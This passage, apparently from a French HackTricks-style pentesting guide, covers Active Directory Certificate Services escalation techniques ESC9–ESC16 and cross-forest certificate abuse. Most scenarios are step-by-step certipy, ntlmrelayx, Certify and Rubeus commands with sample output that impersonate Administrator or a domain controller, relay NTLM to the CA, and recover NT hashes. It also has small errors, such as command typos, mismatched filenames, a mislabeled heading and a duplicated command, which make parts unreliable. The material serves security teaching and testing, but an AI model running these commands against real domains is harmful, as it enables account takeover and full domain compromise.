- Des permissions `GenericWrite` sont disponibles sur un compte quelconque permettant de compromettre un autre.

### Scénario d'abus

Supposons que `John@corp.local` dispose des permissions `GenericWrite` sur `Jane@corp.local`, dans le but de compromettre `Administrator@corp.local`. Le template de certificat `ESC9`, dans lequel `Jane@corp.local` est autorisée à s'enregistrer, est configuré avec le flag `CT_FLAG_NO_SECURITY_EXTENSION` dans son paramètre `msPKI-Enrollment-Flag`.

Initialement, le hash de `Jane` est acquis en utilisant Shadow Credentials, grâce au `GenericWrite` de `John` :
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Par la suite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, omettant volontairement la partie de domaine `@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Cette modification ne viole pas les contraintes, étant donné que `Administrator@corp.local` reste distinct en tant que userPrincipalName de `Administrator`.

Ensuite, le template de certificat `ESC9`, marqué comme vulnérable, est demandé en tant que `Jane` :
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
On note que le certificat `userPrincipalName` reflète `Administrator`, dépourvu de tout “object SID”.

Le `userPrincipalName` de `Jane` est ensuite restauré à son original, `Jane@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Tenter une authentification avec le certificat délivré renvoie maintenant le hash NT de `Administrator@corp.local`. La commande doit inclure `-domain <domain>` en raison de l'absence de spécification de domaine dans le certificat :
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

ESC10 fait référence à deux valeurs de registre sur le contrôleur de domaine :

- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.

**Case 1**

When `StrongCertificateBindingEnforcement` is configured as `0`.

**Case 2**

If `CertificateMappingMethods` includes the `UPN` bit (`0x4`).

### Abuse Case 1

Avec `StrongCertificateBindingEnforcement` configuré à `0`, un compte A disposant de permissions `GenericWrite` peut être exploité pour compromettre n’importe quel compte B.

Par exemple, en ayant les permissions `GenericWrite` sur `Jane@corp.local`, un attaquant vise à compromettre `Administrator@corp.local`. La procédure reflète ESC9, permettant l’utilisation de n’importe quel certificate template.

Initialement, le hash de `Jane` est récupéré en utilisant Shadow Credentials, en exploitant le `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Par la suite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, omettant délibérément la partie `@corp.local` pour éviter une violation de contrainte.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ensuite, un certificat permettant l'authentification client est demandé en tant que `Jane`, en utilisant le modèle `User` par défaut.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur d'origine, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
L'authentification avec le certificat obtenu renverra le NT hash de `Administrator@corp.local`, ce qui oblige à spécifier le domaine dans la commande en raison de l'absence des informations de domaine dans le certificat.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Cas d'abus 2

Lorsque `CertificateMappingMethods` contient le bit flag `UPN` (`0x4`), un compte A disposant des permissions `GenericWrite` peut compromettre n'importe quel compte B dépourvu de la propriété `userPrincipalName`, y compris les comptes machine et le compte administrateur de domaine intégré `Administrator`.

Ici, l'objectif est de compromettre `DC$@corp.local`, en commençant par obtenir le hash de `Jane` via Shadow Credentials, en tirant parti du `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Le `userPrincipalName` de `Jane` est ensuite défini sur `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Un certificat pour l'authentification client est demandé en tant que `Jane` en utilisant le modèle par défaut `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Le `userPrincipalName` de `Jane` est rétabli à sa valeur d'origine après ce processus.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Pour s'authentifier via Schannel, l'option `-ldap-shell` de Certipy est utilisée, indiquant un succès d'authentification en tant que `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
À travers le LDAP shell, des commandes telles que `set_rbcd` permettent des attaques Resource-Based Constrained Delegation (RBCD), pouvant compromettre le contrôleur de domaine.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Cette vulnérabilité s'étend également à tout compte utilisateur dépourvu d'un `userPrincipalName` ou lorsque celui-ci ne correspond pas au `sAMAccountName`. Le compte par défaut `Administrator@corp.local` est une cible de choix en raison de ses privilèges LDAP élevés et de l'absence par défaut d'un `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Explication

If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Vous pouvez utiliser `certipy` pour vérifier si `Enforce Encryption for Requests` est Disabled et certipy affichera les vulnérabilités `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scénario d'abus

Il faut configurer un serveur relais :
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Remarque : pour les contrôleurs de domaine, il faut spécifier `-template` dans DomainController.

Ou en utilisant [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explication

Les administrateurs peuvent configurer la CA pour la stocker sur un périphérique externe comme le "Yubico YubiHSM2".

Si un périphérique USB est connecté au serveur CA via un port USB, ou via un USB device server si le serveur CA est une machine virtuelle, une authentication key (parfois appelée "password") est requise pour que le Key Storage Provider génère et utilise des clés dans le YubiHSM.

Cette key/password est stockée dans le registre sous `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` en clair.

Référence : [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scénario d'abus

Si la clé privée de la CA est stockée sur un périphérique USB physique lorsque vous obtenez un shell access, il est possible de récupérer la clé.

D'abord, vous devez obtenir le certificat de la CA (il est public) puis :
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Enfin, utilisez la commande certutil `-sign` pour forger un nouveau certificat arbitraire en utilisant le certificat CA et sa clé privée.

## OID Group Link Abuse - ESC13

### Explication

L'attribut `msPKI-Certificate-Policy` permet d'ajouter la politique d'émission au modèle de certificat. Les objets `msPKI-Enterprise-Oid` responsables de l'émission des politiques peuvent être découverts dans le Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) du conteneur PKI OID. Une politique peut être liée à un groupe AD en utilisant l'attribut `msDS-OIDToGroupLink` de cet objet, ce qui permet à un système d'autoriser un utilisateur qui présente le certificat comme s'il était membre du groupe. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

En d'autres termes, lorsqu'un utilisateur a la permission d'enregistrer un certificat et que le certificat est lié à un OID group, l'utilisateur peut hériter des privilèges de ce groupe.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scénario d'abus

Rechercher une permission utilisateur exploitable avec `certipy find` ou `Certify.exe find /showAllPermissions`.

Si `John` a la permission d'enrôlement pour `VulnerableTemplate`, l'utilisateur peut hériter des privilèges du groupe `VulnerableGroup`.

Il lui suffit de spécifier le template ; il obtiendra un certificat avec les droits OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuration de renouvellement de certificat vulnérable - ESC14

### Explication

La description sur https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping est remarquablement complète. Ci-dessous une citation du texte original.

ESC14 traite des vulnérabilités résultant d'un mappage explicite de certificat faible, principalement par la mauvaise utilisation ou la configuration non sécurisée de l'attribut `altSecurityIdentities` sur les comptes d'utilisateurs ou d'ordinateurs Active Directory. Cet attribut multivalué permet aux administrateurs d'associer manuellement des certificats X.509 à un compte AD pour des fins d'authentification. Lorsqu'il est renseigné, ces mappages explicites peuvent remplacer la logique de mappage de certificat par défaut, qui s'appuie typiquement sur les UPN ou les noms DNS dans le SAN du certificat, ou sur le SID intégré dans l'extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`.

Un mappage « faible » se produit lorsque la valeur de chaîne utilisée dans l'attribut `altSecurityIdentities` pour identifier un certificat est trop large, facilement devinable, repose sur des champs de certificat non uniques, ou utilise des composants de certificat facilement usurpables. Si un attaquant peut obtenir ou créer un certificat dont les attributs correspondent à un tel mappage explicite faiblement défini pour un compte privilégié, il peut utiliser ce certificat pour s'authentifier en tant que ce compte et usurper son identité.

Exemples de chaînes de mappage `altSecurityIdentities` potentiellement faibles incluent :

- Mappage uniquement par un Subject Common Name (CN) courant : par ex., `X509:<S>CN=SomeUser`. Un attaquant pourrait être capable d'obtenir un certificat avec ce CN depuis une source moins sécurisée.
- Utiliser des Issuer Distinguished Names (DN) ou Subject DNs trop génériques sans qualification supplémentaire comme un numéro de série spécifique ou un subject key identifier : par ex., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Employer d'autres motifs prévisibles ou des identifiants non cryptographiques qu'un attaquant pourrait satisfaire dans un certificat qu'il peut obtenir légitimement ou falsifier (s'il a compromis une CA ou trouvé un template vulnérable comme dans ESC1).

L'attribut `altSecurityIdentities` prend en charge différents formats de mappage, tels que :

- `X509:<I>IssuerDN<S>SubjectDN` (mappe selon l'Issuer et le Subject DN complets)
- `X509:<SKI>SubjectKeyIdentifier` (mappe par la valeur de l'extension Subject Key Identifier du certificat)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mappe par numéro de série, implicitement qualifié par l'Issuer DN) - ce n'est pas un format standard, habituellement c'est `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mappe selon un nom RFC822, typiquement une adresse e-mail, provenant du SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mappe par un hash SHA1 de la clé publique brute du certificat — généralement robuste)

La sécurité de ces mappages dépend fortement de la spécificité, de l'unicité et de la force cryptographique des identifiants de certificat choisis dans la chaîne de mappage. Même avec des modes de binding de certificat stricts activés sur les Domain Controllers (qui affectent principalement les mappages implicites basés sur les SAN UPNs/DNS et l'extension SID), une entrée `altSecurityIdentities` mal configurée peut toujours présenter une voie directe pour l'usurpation si la logique de mappage elle-même est défaillante ou trop permissive.
### Scénario d'abus

ESC14 cible les **mappages explicites de certificats** dans Active Directory (AD), spécifiquement l'attribut `altSecurityIdentities`. Si cet attribut est défini (par conception ou par mauvaise configuration), des attaquants peuvent usurper des comptes en présentant des certificats correspondant au mappage.

#### Scénario A : L'attaquant peut écrire dans `altSecurityIdentities`

**Précondition** : L'attaquant dispose des permissions d'écriture sur l'attribut `altSecurityIdentities` du compte cible ou du droit de l'accorder sous la forme de l'une des permissions suivantes sur l'objet AD cible :
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scénario B : La cible a un mappage faible via X509RFC822 (email)

- **Précondition** : La cible a un mappage X509RFC822 faible dans altSecurityIdentities. Un attaquant peut définir l'attribut mail de la victime pour qu'il corresponde au nom X509RFC822 de la cible, demander un certificat en tant que la victime, et l'utiliser pour s'authentifier en tant que la cible.
#### Scénario C : La cible a un mappage X509IssuerSubject

- **Précondition** : La cible a un mappage explicite X509IssuerSubject faible dans `altSecurityIdentities`. L'attaquant peut définir l'attribut `cn` ou `dNSHostName` sur un principal victime pour qu'il corresponde au subject du mappage X509IssuerSubject de la cible. Ensuite, l'attaquant peut demander un certificat en tant que la victime et utiliser ce certificat pour s'authentifier en tant que la cible.
#### Scénario D : La cible a un mappage X509SubjectOnly

- **Précondition** : La cible a un mappage explicite X509SubjectOnly faible dans `altSecurityIdentities`. L'attaquant peut définir l'attribut `cn` ou `dNSHostName` sur un principal victime pour qu'il corresponde au subject du mappage X509SubjectOnly de la cible. Ensuite, l'attaquant peut demander un certificat en tant que la victime et utiliser ce certificat pour s'authentifier en tant que la cible.
### opérations concrètes
#### Scénario A

Demander un certificat du modèle de certificat `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Enregistrer et convertir le certificat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
S'authentifier (en utilisant le certificat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Nettoyage (optionnel)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explication

La description sur https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc est remarquablement complète. Ci-dessous se trouve une citation du texte original.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Abus

Le texte suivant fait référence à [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Cliquez pour voir des méthodes d'utilisation plus détaillées.

Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scénario A : Usurpation directe via Schannel

**Étape 1 : Demander un certificat, en injectant l'Application Policy "Client Authentication" et le UPN cible.** L'attaquant `attacker@corp.local` cible `administrator@corp.local` en utilisant le template V1 "WebServer" (which allows enrollee-supplied subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Le template V1 vulnérable avec "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Injecte l'OID `1.3.6.1.5.5.7.3.2` dans l'extension Application Policies du CSR.
- `-upn 'administrator@corp.local'`: Définit le UPN dans le SAN pour l'usurpation d'identité.

**Step 2: S'authentifier via Schannel (LDAPS) en utilisant le certificat obtenu.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scénario B : PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Étape 1 : demander un certificat à partir d'un V1 template (with "Enrollee supplies subject"), en injectant l'Application Policy "Certificate Request Agent".** Ce certificat est destiné à l'attaquant (`attacker@corp.local`) pour devenir un enrollment agent. Aucun UPN n'est spécifié pour l'identité de l'attaquant ici, car l'objectif est la capacité d'enrollment agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injecte l'OID `1.3.6.1.4.1.311.20.2.1`.

**Étape 2 : Utiliser le certificat "agent" pour demander un certificat au nom d'un utilisateur privilégié cible.** Il s'agit d'une étape de type ESC3, utilisant le certificat de l'étape 1 comme certificat agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Étape 3 : S'authentifier en tant qu'utilisateur privilégié en utilisant le certificat "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explication

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** fait référence au scénario où, si la configuration de AD CS n'impose pas l'inclusion de l'extension **szOID_NTDS_CA_SECURITY_EXT** dans tous les certificats, un attaquant peut exploiter cela en :

1. Demander un certificat **sans SID binding**.

2. Utiliser ce certificat **pour s'authentifier comme n'importe quel compte**, par exemple en usurpant un compte à privilèges élevés (p. ex., un Domain Administrator).

Vous pouvez également consulter cet article pour en savoir plus sur le principe détaillé :https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abus

La référence suivante renvoie à [ce lien](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), cliquez pour voir des méthodes d'utilisation plus détaillées.

Pour déterminer si l'environnement Active Directory Certificate Services (AD CS) est vulnérable à **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Étape 1 : Lire le UPN initial du compte victime (Optionnel - pour la restauration).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Étape 2 : Mettre à jour l'UPN du compte victime avec le `sAMAccountName` de l'administrateur ciblé.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Étape 3 : (Si nécessaire) Obtenir des identifiants pour le compte "victim" (par exemple, via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Étape 4 : Demandez un certificat en tant qu'utilisateur "victim" à partir de _n'importe quel modèle d'authentification client approprié_ (p. ex., "User") sur la CA vulnérable à ESC16.** Comme la CA est vulnérable à ESC16, elle omettra automatiquement l'extension de sécurité SID du certificat émis, indépendamment des paramètres spécifiques du modèle pour cette extension. Définissez la variable d'environnement du cache d'identifiants Kerberos (commande shell) :
```bash
export KRB5CCNAME=victim.ccache
```
Ensuite, demandez le certificat :
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Étape 5 : Rétablir le UPN du compte "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Étape 6 : S'authentifier en tant qu'administrateur cible.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

La configuration pour le **cross-forest enrollment** est relativement simple. Le **root CA certificate** de la forêt de ressources est **publié dans les account forests** par les administrateurs, et les certificats de l'**Enterprise CA** de la forêt de ressources sont **ajoutés aux conteneurs `NTAuthCertificates` et AIA dans chaque account forest**. Pour clarifier, cette disposition confère à la **CA de la forêt de ressources un contrôle total** sur toutes les autres forêts pour lesquelles elle gère la PKI. Si cette CA est **compromise par des attaquants**, des certificats pour tous les utilisateurs tant de la forêt de ressources que des forêts de comptes pourraient être **falsifiés par ceux-ci**, brisant ainsi la frontière de sécurité de la forêt.

### Enrollment Privileges Granted to Foreign Principals

Dans des environnements multi-forêts, il convient d'être prudent concernant les Enterprise CAs qui **publish certificate templates** autorisant les **Authenticated Users or foreign principals** (utilisateurs/groupes externes à la forêt à laquelle appartient l'Enterprise CA) à **enrollment and edit rights**.\
Lorsqu'une authentification s'effectue via un trust, l'**Authenticated Users SID** est ajouté au token de l'utilisateur par AD. Ainsi, si un domaine possède une Enterprise CA avec un template qui **allows Authenticated Users enrollment rights**, un template pourrait potentiellement être **enrolled by a user from a different forest**. De même, si des **enrollment rights** sont explicitement accordés à un foreign principal par un template, une **cross-forest access-control relationship** est alors créée, permettant à un principal d'une forêt de **enroll in a template from another forest**.

Les deux scénarios entraînent une **augmentation de la surface d'attaque** d'une forêt vers une autre. Les paramètres du certificate template pourraient être exploités par un attaquant pour obtenir des privilèges supplémentaires dans un domaine étranger.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
